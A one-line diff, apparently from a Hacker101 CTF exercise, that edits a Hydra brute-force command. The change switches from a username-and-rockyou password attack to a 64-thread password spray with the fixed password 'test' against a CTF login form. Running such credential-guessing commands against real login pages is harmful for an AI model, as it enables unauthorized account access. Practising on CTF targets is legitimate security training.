@@ -1,1 +1,1 @@
-hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt 248fbeb3da473679d25fdea05a98e4e0.ctf.hacker101.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid username"
+hydra -t 64 -L /usr/share/wordlists/usernames.txt -p test d13572da69b34e875361ff1be3c70f43.ctf.hacker101.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid username"
